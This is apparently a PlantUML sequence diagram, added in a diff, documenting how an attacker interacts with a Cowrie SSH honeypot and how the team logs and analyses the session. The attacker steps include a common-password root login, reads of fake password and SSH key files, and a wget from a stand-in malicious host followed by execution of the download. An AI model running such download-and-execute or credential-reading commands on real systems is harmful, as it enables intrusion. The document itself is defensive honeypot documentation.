@@ -1,0 +1,125 @@
+@startuml Attack Sequence Diagram
+!theme sketchy-outline
+title Honeypot Attack Sequence - Cowrie SSH Honeypot Interaction
+
+actor "Attacker" as attacker
+participant "AWS Security Group" as sg
+participant "EC2 Instance\n(44.222.200.1)" as ec2
+participant "Cowrie Honeypot\n(Port 2222)" as cowrie
+database "Honeypot Filesystem" as honeyfs
+database "Log Files" as logs
+participant "Team Monitoring" as team
+
+== Initial Discovery ==
+attacker -> sg : Port scan\n(TCP 22, 2222, etc.)
+sg -> ec2 : Allow traffic\n(Security Group Rules)
+ec2 -> attacker : Port 2222 open\n(SSH service response)
+
+note right of attacker
+  Attacker discovers what appears
+  to be an SSH service running
+  on port 2222
+end note
+
+== Authentication Attempt ==
+attacker -> cowrie : SSH connection attempt\nssh root@44.222.200.1 -p 2222
+cowrie -> logs : **LOG**: Connection from attacker IP
+cowrie -> attacker : SSH banner\n"SSH-2.0-OpenSSH_6.0p1"
+
+attacker -> cowrie : Username: root
+attacker -> cowrie : Password: 123456
+cowrie -> logs : **LOG**: Login attempt\nroot:123456
+cowrie -> attacker : Authentication success\n(fake acceptance)
+
+note over cowrie
+  Cowrie accepts most common
+  passwords to encourage
+  continued interaction
+end note
+
+== Exploration Phase ==
+attacker -> cowrie : whoami
+cowrie -> honeyfs : Check fake /etc/passwd
+honeyfs -> cowrie : Return "root"
+cowrie -> attacker : root
+cowrie -> logs : **LOG**: Command executed: whoami
+
+attacker -> cowrie : ls -la
+cowrie -> honeyfs : List fake directory contents
+honeyfs -> cowrie : Realistic file listing
+cowrie -> attacker : Show fake files/directories
+cowrie -> logs : **LOG**: Command executed: ls -la
+
+attacker -> cowrie : cd /home/admin
+cowrie -> honeyfs : Navigate to fake directory
+cowrie -> attacker : Directory changed
+cowrie -> logs : **LOG**: Directory change: /home/admin
+
+== Discovery of "Sensitive" Files ==
+attacker -> cowrie : ls -la
+cowrie -> honeyfs : Show fake sensitive files
+honeyfs -> cowrie : Documents/passwords.txt\n.ssh/id_rsa (fake keys)
+cowrie -> attacker : Display fake sensitive files
+
+attacker -> cowrie : cat Documents/passwords.txt
+cowrie -> honeyfs : Read fake password file
+honeyfs -> cowrie : Fake credentials:\nadmin:password123\nuser:qwerty
+cowrie -> attacker : Display fake passwords
+cowrie -> logs : **LOG**: Accessed sensitive file\npasswords.txt
+
+attacker -> cowrie : cat .ssh/id_rsa
+cowrie -> honeyfs : Read fake SSH private key
+honeyfs -> cowrie : Realistic-looking fake key
+cowrie -> attacker : Display fake SSH key
+cowrie -> logs : **LOG**: Accessed SSH private key
+
+== Malicious Activity ==
+attacker -> cowrie : wget http://malicious-site.com/malware
+cowrie -> logs : **LOG**: Download attempt\nmalicious-site.com/malware
+cowrie -> attacker : Fake download success
+cowrie -> honeyfs : Store in fake filesystem
+
+attacker -> cowrie : chmod +x malware
+cowrie -> logs : **LOG**: File permissions changed
+cowrie -> attacker : Permissions changed
+
+attacker -> cowrie : ./malware
+cowrie -> logs : **LOG**: Malware execution attempt
+cowrie -> attacker : Fake execution output
+cowrie -> honeyfs : Simulate file changes
+
+== Team Monitoring ==
+logs -> team : **ALERT**: Suspicious activity detected
+team -> logs : Review attack patterns\nAnalyze commands
+team -> logs : Export session logs\nfor analysis
+
+note over team
+  Team can review:
+  • Complete session recordings
+  • All commands executed
+  • Files accessed/downloaded
+  • Attack patterns and techniques
+end note
+
+== Session Termination ==
+attacker -> cowrie : exit
+cowrie -> logs : **LOG**: Session terminated\nDuration: XX minutes
+cowrie -> attacker : Connection closed
+
+== Post-Attack Analysis ==
+team -> logs : Analyze attack session
+team -> logs : Extract IoCs\n(URLs, IPs, malware)
+team -> logs : Document attack techniques
+team -> logs : Update security intelligence
+
+note over logs
+  Complete audit trail:
+  • Source IP and geolocation
+  • Session duration
+  • Commands executed
+  • Files accessed
+  • Malware samples
+  • Attack timeline
+end note
+
+@enduml
